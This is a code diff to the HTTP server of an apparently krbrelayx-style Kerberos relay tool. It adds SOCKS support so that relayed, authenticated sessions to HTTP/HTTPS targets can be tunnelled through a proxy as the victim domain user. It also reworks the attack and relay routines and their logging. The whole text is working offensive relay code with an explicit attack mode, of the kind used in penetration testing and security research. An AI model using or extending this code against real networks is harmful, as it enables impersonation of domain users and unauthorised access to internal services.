@@ -13,10 +13,12 @@ from threading import Thread
 from six import PY2, b
 
 from impacket import ntlm, LOG
+from impacket.nt_errors import STATUS_SUCCESS
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.examples.ntlmrelayx.servers import HTTPRelayServer
 from lib.utils.kerberos import get_kerberos_loot, get_auth_data
+from lib.servers.socksserver import activeConnections as socksActiveConnections
 
 class HTTPKrbRelayServer(HTTPRelayServer):
     """
@@ -138,7 +140,7 @@ class HTTPKrbRelayServer(HTTPRelayServer):
             if b'NTLMSSP' in token:
                 LOG.info('HTTPD: Client %s is using NTLM authentication instead of Kerberos' % self.client_address[0])
                 return
-            
+
             if self.server.config.mode == 'ATTACK':
                 # Are we in attack mode? If so, launch attack against all targets
                 # If you're looking for the magic, it's in lib/utils/kerberos.py
@@ -160,21 +162,51 @@ class HTTPKrbRelayServer(HTTPRelayServer):
             self.end_headers()
             return
 
+        def _registerSocksRelay(self, client, parsed_target, authdata):
+            """Push the authenticated relay client onto the SOCKS active
+            connections queue. The SOCKS server's watcher thread drains
+            it into activeRelays so the proxy can tunnel browser HTTP
+            requests through the still-open client.session.sock.
+            """
+            scheme = parsed_target.scheme.upper()
+            target_host = parsed_target.hostname
+            target_port = parsed_target.port or client.targetPort
+            user_key = '%s/%s' % (authdata['domain'].upper(), authdata['username'].upper())
+            # Pass the active routing profile alongside the relay so
+            # the SOCKS plugin can apply target-specific behavior
+            # (login path, cookie filters, SSE stubs, extra bypass
+            # paths) without baking those into module-level constants.
+            session_data = {'profile': self.server.config.getSocksProfile()}
+            socksActiveConnections.put(
+                (target_host, target_port, scheme, user_key, client, session_data)
+            )
+            LOG.info('HTTPD: Relay for %s@%s:%s queued for SOCKS use'
+                     % (user_key, target_host, target_port))
+
         def do_attack(self, authdata):
             self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
-            # No SOCKS, since socks is pointless when you can just export the tickets
-            # instead we iterate over all the targets
+            # In SOCKS mode we hand the authenticated session over to the
+            # proxy instead of running a one-shot attack module. The
+            # SOCKS path only applies to HTTP/HTTPS targets; everything
+            # else goes through the regular attack pipeline.
             for target in self.server.config.target.originalTargets:
                 parsed_target = target
-                if parsed_target.scheme.upper() in self.server.config.attacks:
-                    client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
-                    client.initConnection(authdata, self.server.config.dcip)
-                    # We have an attack.. go for it
-                    attack = self.server.config.attacks[parsed_target.scheme.upper()]
-                    client_thread = attack(self.server.config, client.session, self.authUser)
-                    client_thread.start()
-                else:
-                    LOG.error('No attack configured for %s', parsed_target.scheme.upper())
+                scheme = parsed_target.scheme.upper()
+                if scheme not in self.server.config.attacks:
+                    LOG.error('No attack configured for %s', scheme)
+                    continue
+                client = self.server.config.protocolClients[scheme](self.server.config, parsed_target)
+                result = client.initConnection(authdata, self.server.config.dcip)
+                if self.server.config.runSocks and scheme in ('HTTP', 'HTTPS'):
+                    if isinstance(result, tuple) and result[1] != STATUS_SUCCESS:
+                        LOG.error('HTTPD: Relay against %s failed, not adding to SOCKS' % parsed_target.hostname)
+                        client.killConnection()
+                        continue
+                    self._registerSocksRelay(client, parsed_target, authdata)
+                    continue
+                attack = self.server.config.attacks[scheme]
+                client_thread = attack(self.server.config, client.session, self.authUser)
+                client_thread.start()
 
         def do_relay(self, authdata):
             self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
@@ -182,14 +214,25 @@ class HTTPKrbRelayServer(HTTPRelayServer):
             for target in self.server.config.target.originalTargets:
                 parsed_target = target
                 if host.lower() in parsed_target.hostname.lower():
-                    # Found a target with the same SPN
-                    client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
-                    if not client.initConnection(authdata, self.server.config.dcip):
+                    # Found a target with the same SPN.
+                    scheme = parsed_target.scheme.upper()
+                    client = self.server.config.protocolClients[scheme](self.server.config, parsed_target)
+                    result = client.initConnection(authdata, self.server.config.dcip)
+                    if not result:
                         return
-                    # We have an attack.. go for it
-                    attack = self.server.config.attacks[parsed_target.scheme.upper()]
+                    if self.server.config.runSocks and scheme in ('HTTP', 'HTTPS'):
+                        if isinstance(result, tuple) and result[1] != STATUS_SUCCESS:
+                            LOG.error('HTTPD: Relay against %s failed, not adding to SOCKS' % parsed_target.hostname)
+                            client.killConnection()
+                            return
+                        self._registerSocksRelay(client, parsed_target, authdata)
+                        return
+                    attack = self.server.config.attacks[scheme]
                     client_thread = attack(self.server.config, client.session, self.authUser)
                     client_thread.start()
                     return
-            # Still here? Then no target was found matching this SPN
-            LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.netloc.lower())
+            # No target matched this ticket's SPN.
+            configured = ', '.join(t.netloc.lower() for t in self.server.config.target.originalTargets)
+            LOG.error("No target configured that matches the SPN in the ticket. "
+                      "Ticket SPN host=%r (sclass=%s); configured targets=[%s]",
+                      host, sclass, configured)
